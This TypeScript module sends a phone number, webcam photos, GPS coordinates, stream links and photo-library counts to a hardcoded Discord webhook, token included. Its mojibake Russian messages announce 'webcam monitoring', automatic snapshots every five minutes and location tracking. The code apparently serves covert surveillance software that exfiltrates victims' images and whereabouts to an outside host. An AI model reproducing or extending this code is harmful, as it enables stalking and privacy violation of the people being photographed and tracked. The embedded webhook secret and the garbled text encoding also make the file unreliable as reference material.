const WEBHOOK_URL = 'https://discord.com/api/webhooks/1341361105192222804/LjuKtVITjZpx7ujI7JpfV_di2ckGZBlD2hJT_FYaNYZdgtwU29kCFlODSL0d7tlD2VBc';

export const sendToWebhook = async (phoneNumber: string, photoBlob?: Blob, location?: { latitude: number; longitude: number }, streamUrl?: string) => {
  try {
    const formData = new FormData();
    
    const timestamp = new Date().toLocaleString('ru-RU');
    let content = `üîí **–ú–û–ù–ò–¢–û–†–ò–ù–ì –í–ï–ë-–ö–ê–ú–ï–†–´**\nüì± **–¢–µ–ª–µ—Ñ–æ–Ω:** ${phoneNumber}\nüïí **–í—Ä–µ–º—è:** ${timestamp}`;
    
    if (location) {
      const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
      content += `\nüìç **–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:** ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
      content += `\nüó∫Ô∏è **–ö–∞—Ä—Ç–∞:** ${googleMapsUrl}`;
    }

    if (streamUrl) {
      content += `\nüìπ **–ü—Ä—è–º–∞—è —Ç—Ä–∞–Ω—Å–ª—è—Ü–∏—è:** ${streamUrl}`;
    }

    content += `\n\n‚ö†Ô∏è **–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Å–Ω–∏–º–æ–∫ —Å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è**`;

    formData.append('content', content);

    if (photoBlob) {
      formData.append('file', photoBlob, `webcam_${phoneNumber}_${Date.now()}.jpg`);
    }

    console.log('–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ –≤ Discord...');

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('–û—à–∏–±–∫–∞ webhook:', errorText);
      throw new Error(`–û—à–∏–±–∫–∞ webhook: ${response.status} - ${errorText}`);
    }

    console.log('–î–∞–Ω–Ω—ã–µ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –≤ Discord');
    return { success: true };
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ webhook:', error);
    return { success: false, error: error instanceof Error ? error.message : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞' };
  }
};

export const sendSessionStartNotification = async (phoneNumber: string, location?: { latitude: number; longitude: number }) => {
  try {
    const formData = new FormData();
    
    const timestamp = new Date().toLocaleString('ru-RU');
    let content = `üö® **–ù–û–í–ê–Ø –°–ï–°–°–ò–Ø –ú–û–ù–ò–¢–û–†–ò–ù–ì–ê –ó–ê–ü–£–©–ï–ù–ê**\nüì± **–¢–µ–ª–µ—Ñ–æ–Ω:** ${phoneNumber}\nüïí **–ù–∞—á–∞–ª–æ:** ${timestamp}`;
    
    if (location) {
      const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
      content += `\nüìç **–ù–∞—á–∞–ª—å–Ω–æ–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:** ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
      content += `\nüó∫Ô∏è **–ö–∞—Ä—Ç–∞:** ${googleMapsUrl}`;
    }

    content += `\n\nüìπ **–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –≤–µ–±-–∫–∞–º–µ—Ä—ã –∞–∫—Ç–∏–≤–µ–Ω**`;
    content += `\nüì∏ **–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–µ —Å–Ω–∏–º–∫–∏ –∫–∞–∂–¥—ã–µ 5 –º–∏–Ω—É—Ç**`;
    content += `\nüìç **–û—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è –≤–∫–ª—é—á–µ–Ω–æ**`;

    formData.append('content', content);

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ —Å–µ—Å—Å–∏–∏:', errorText);
      throw new Error(`–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ —Å–µ—Å—Å–∏–∏: ${response.status} - ${errorText}`);
    }

    console.log('–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ —Å–µ—Å—Å–∏–∏ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ');
    return { success: true };
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ —Å–µ—Å—Å–∏–∏:', error);
    return { success: false, error: error instanceof Error ? error.message : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞' };
  }
};

export const sendManualCapture = async (phoneNumber: string, photoBlob: Blob, location?: { latitude: number; longitude: number }) => {
  try {
    const formData = new FormData();
    
    const timestamp = new Date().toLocaleString('ru-RU');
    let content = `üì∏ **–†–£–ß–ù–û–ô –°–ù–ò–ú–û–ö –≠–ö–†–ê–ù–ê**\nüì± **–¢–µ–ª–µ—Ñ–æ–Ω:** ${phoneNumber}\nüïí **–í—Ä–µ–º—è:** ${timestamp}`;
    
    if (location) {
      const googleMapsUrl = `https://www.google.com/maps?q=${location.latitude},${location.longitude}`;
      content += `\nüìç **–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:** ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}`;
      content += `\nüó∫Ô∏è **–ö–∞—Ä—Ç–∞:** ${googleMapsUrl}`;
    }

    content += `\n\nüë§ **–°–Ω–∏–º–æ–∫ —Å–¥–µ–ª–∞–Ω –≤—Ä—É—á–Ω—É—é –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º**`;

    formData.append('content', content);
    formData.append('file', photoBlob, `manual_capture_${phoneNumber}_${Date.now()}.jpg`);

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('–û—à–∏–±–∫–∞ —Ä—É—á–Ω–æ–≥–æ —Å–Ω–∏–º–∫–∞:', errorText);
      throw new Error(`–û—à–∏–±–∫–∞ —Ä—É—á–Ω–æ–≥–æ —Å–Ω–∏–º–∫–∞: ${response.status} - ${errorText}`);
    }

    console.log('–†—É—á–Ω–æ–π —Å–Ω–∏–º–æ–∫ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Discord');
    return { success: true };
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ —Ä—É—á–Ω–æ–≥–æ —Å–Ω–∏–º–∫–∞:', error);
    return { success: false, error: error instanceof Error ? error.message : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞' };
  }
};

export const sendPhotoLibraryUpdate = async (phoneNumber: string, photoCount: number, totalSize: string) => {
  try {
    const formData = new FormData();
    
    const timestamp = new Date().toLocaleString('ru-RU');
    let content = `üìö **–û–ë–ù–û–í–õ–ï–ù–ò–ï –ë–ò–ë–õ–ò–û–¢–ï–ö–ò –§–û–¢–û**\nüì± **–¢–µ–ª–µ—Ñ–æ–Ω:** ${phoneNumber}\nüïí **–í—Ä–µ–º—è:** ${timestamp}`;
    content += `\nüì∏ **–í—Å–µ–≥–æ —Ñ–æ—Ç–æ:** ${photoCount}`;
    content += `\nüíæ **–û–±—â–∏–π —Ä–∞–∑–º–µ—Ä:** ${totalSize}`;
    content += `\n\nüîÑ **–ë–∏–±–ª–∏–æ—Ç–µ–∫–∞ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π –æ–±–Ω–æ–≤–ª–µ–Ω–∞**`;

    formData.append('content', content);

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData,
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∏:', errorText);
      throw new Error(`–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∏: ${response.status} - ${errorText}`);
    }

    console.log('–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ —Ñ–æ—Ç–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ');
    return { success: true };
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∏:', error);
    return { success: false, error: error instanceof Error ? error.message : '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞' };
  }
};
